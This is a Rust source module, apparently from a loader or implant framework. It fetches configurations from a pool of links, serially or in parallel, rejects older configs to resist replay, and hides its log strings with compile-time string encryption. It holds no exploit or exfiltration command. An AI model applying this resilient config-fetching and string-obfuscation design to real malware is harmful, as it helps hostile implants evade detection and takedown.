use crate::config::CCC;
use crate::link::Lk;
use crate::link::LinkFetch;
//use crate::payload::Payload;
use crate::rundata::RunData;

use anyhow::bail;
use rand::seq::SliceRandom;
use serde::{Deserialize, Serialize};
use std::thread;

use cryptify::encrypt_string;
use log::debug;
use log::info;
use log::warn;

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct Advanced {
    #[serde(rename = "r")]
    pub random: u64, // fetch only x random link from pool and ignore the other, (0 not set)
    #[serde(rename = "mlb")]
    pub max_link_broken: u64, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
    #[serde(rename = "pll")]
    pub parallel: bool,       // try to fetch every link in the same time, if not its one by one
    #[serde(rename = "ln")]
    pub linear: bool,         // fetch link in the order or randomized
    #[serde(rename = "st")]
    pub stop_same: bool,      // stop if found the same conf -> not for parallel_fetch
    #[serde(rename = "sn")]
    pub stop_new: bool,       // stop if found a new conf -> not for parallel_fetch
    #[serde(rename = "ao")]
    pub accept_old: bool, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub enum POM {
    #[serde(rename = "si")]
    SIMPLE,
    #[serde(rename = "ad")]
    ADVANCED(Advanced),
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct Plk {
    #[serde(rename = "pm")]
    pub pool_mode: POM,
    #[serde(rename = "pl")]
    pub pool_links: Vec<Lk>,
}

impl Plk {
    pub fn update_pool(
        &self,
        config: &CCC,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
    ) -> Result<CCC, anyhow::Error> {
        match &self.pool_mode {
            POM::SIMPLE => self.update_links_simple(config, session_id, run_data),
            POM::ADVANCED(advanced) => {
                self.update_links_advanced(config, advanced, session_id, run_data)
            }
        }
    }

    //TODO update with date check and remove DECISION message, only print the config number if needed.
    pub fn update_links_simple(
        &self,
        config: &CCC,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
    ) -> Result<CCC, anyhow::Error> {
        let advanced = Advanced {
            random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
            max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
            parallel: false,    // try to fetch every link in the same time, if not its one by one
            linear: true,       // fetch link in the order or randomized
            stop_same: false,   // stop if found the same conf -> not for parallel
            stop_new: false,    // stop if found a new conf -> not for parallel
            accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
        };
        self.update_links_advanced(config, &advanced, session_id, run_data)
    }

    pub fn update_links_advanced(
        &self,
        config: &CCC,
        advanced: &Advanced,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
    ) -> Result<CCC, anyhow::Error> {
        let pool_link: Vec<Lk>;

        // create pool_links
        if advanced.random != 0 {
            info!(
                "{}{}/{}",
                encrypt_string!("[+] randomly choose only "),
                advanced.random,
                self.pool_links.len()
            );
            let sample: Vec<Lk> = self
                .pool_links
                .choose_multiple(
                    &mut rand::thread_rng(),
                    advanced
                        .random
                        .try_into()
                        .expect("Value too large to fit into usize"),
                )
                .cloned()
                .collect();
            pool_link = sample;
        } else if advanced.linear {
            pool_link = self.pool_links.clone();
        } else {
            todo!()
            //pool_link=todo!() // TODO not linear -> randomized order, on devrait ptet renommer comme ça.
        }

        let pool_link_len: usize = pool_link.len();
        let mut link_nb: i32 = 0;
        let mut newconfig_list: Vec<(CCC, i32)> = vec![];

        // fetch pool_links and choose a VALID config
        if advanced.parallel {
            info!("{}", encrypt_string!("[+] fetch all link in parallel"));
            let mut handle_list: Vec<thread::JoinHandle<Result<(CCC, i32), anyhow::Error>>> =
                vec![];
            for link in pool_link {
                link_nb = link_nb + 1;
                info!(
                    "{}/{}{}{:?}",
                    link_nb,
                    &pool_link_len,
                    encrypt_string!(" Link: "),
                    &link.get_target()
                );
                //parallel
                //let yolo = run_data.clone();

                let thread_link = link.clone();
                let thread_config = config.clone();
                let thread_advanced = advanced.clone();
                let thread_session_id = session_id.clone();
                let thread_run_data = run_data.clone();
                //let thread_run_data = (*run_data).clone();
                let handle: thread::JoinHandle<Result<(CCC, i32), anyhow::Error>> =
                    thread::spawn(move || {
                        debug!("{}{}", encrypt_string!("thread begin, link: "), link_nb);
                        let newconfig: CCC = thread_link.fetch_config(
                            &thread_config,
                            &thread_advanced,
                            link_nb,
                            &thread_session_id,
                            &thread_run_data,
                        )?;
                        debug!("{}{}", encrypt_string!("thread end, link: {}"), link_nb);
                        Ok((newconfig, link_nb))
                    });
                handle_list.push(handle);
                //not parallel
            }

            info!(
                "{}",
                encrypt_string!("[+] all thread run to fetch a config, wait them finish to join")
            );

            for handle in handle_list {
                match handle.join() {
                    Ok(Ok(conf_i)) => newconfig_list.push(conf_i),
                    Ok(Err(error)) => warn!("{}{:?}", encrypt_string!("Thread failed: "), error),
                    Err(error) => warn!("{}{:?}", encrypt_string!("Thread failed: "), error),
                };
            }
            info!(
                "{}{}/{}{}",
                encrypt_string!("[+] all thread finish, "),
                newconfig_list.len(),
                pool_link_len,
                encrypt_string!(" succeed")
            );
        } else {
            info!("{}", encrypt_string!("[+] fetch all link one by one"));
            for link in pool_link {
                link_nb = link_nb + 1;
                info!(
                    "{}/{}{}{:?}",
                    link_nb,
                    &pool_link_len,
                    encrypt_string!(" Link: "),
                    &link.get_target()
                );
                let newconfig: CCC = match link.fetch_config(
                    config,
                    advanced,
                    link_nb,
                    session_id,
                    run_data,
                ) {
                    Ok(newconfig) => {
                        info!(
                            "{}{}",
                            encrypt_string!("[+] choose config of link "),
                            link_nb
                        );
                        newconfig
                    }
                    Err(error) => {
                        warn!("{}{:?}", encrypt_string!("Check failed: "), error);
                        continue;
                    }
                };
                if advanced.stop_same && config.is_same_loader(&newconfig) {
                    return Ok(newconfig);
                } else if advanced.stop_new && config.date < newconfig.date {
                    return Ok(newconfig);
                } else {
                    newconfig_list.push((newconfig, link_nb));
                }
            }

            info!(
                "[+] all fetch finish, {}/{} succeed",
                newconfig_list.len(),
                pool_link_len
            );
        }

        self.choose_config_from_config_list(config, advanced, newconfig_list)
    }

    pub fn choose_config_from_config_list(
        &self,
        config: &CCC,
        _advanced: &Advanced,
        config_list: Vec<(CCC, i32)>,
    ) -> Result<CCC, anyhow::Error> {
        if config_list.len() == 0 {
            bail!(
                "{}",
                encrypt_string!("No VALID config found in Pool: all link checked")
            )
        }

        //TODO max_link_broken -> en fonction de la taille de config_list, ca donne combien de lien broken ?  , pour ca il faudrait checker pool_link_len

        // place the first config as choosen config
        debug!(
            "{}",
            encrypt_string!("[+] Begin to choose the config to return from pool")
        );

        let mut config_choosen: CCC = config_list[0].0.clone();
        let mut nb_choosen: i32 = config_list[0].1.clone();
        debug!(
            "{}{}",
            encrypt_string!("initial choosen config, link: "),
            nb_choosen
        );

        // if more config, compare date to choosen one
        if config_list.len() >= 2 {
            for (newconf, i) in config_list[1..].to_vec() {
                if config_choosen.date <= newconf.date {
                    if newconf.is_same_loader(&config_choosen) {
                        debug! {"{}{}",encrypt_string!("config date : OK, same config as choosen, link "),i};
                    } else {
                        config_choosen = newconf;
                        nb_choosen = i;
                        debug! {"{}{}",encrypt_string!("config date : OK, NEW choosen config, link "),nb_choosen};
                    }
                } else {
                    debug! {"{}{}",encrypt_string!("config date : TOO OLD, link "),i};
                }
            }
        }
        if config.date <= config_choosen.date {
            info!(
                "{}{}",
                encrypt_string!("[+] choose config of link "),
                nb_choosen
            );
            Ok(config_choosen)
        } else {
            info!(
                "{}{}",
                encrypt_string!("[+] all conf are older than actual config date: "),
                config.date
            );
            bail!(
                "{}{}",
                encrypt_string!(
                    "No VALID config found in Pool: actual running config.date is superior to all config: "
                ), config.date
            )
        }
    }
}
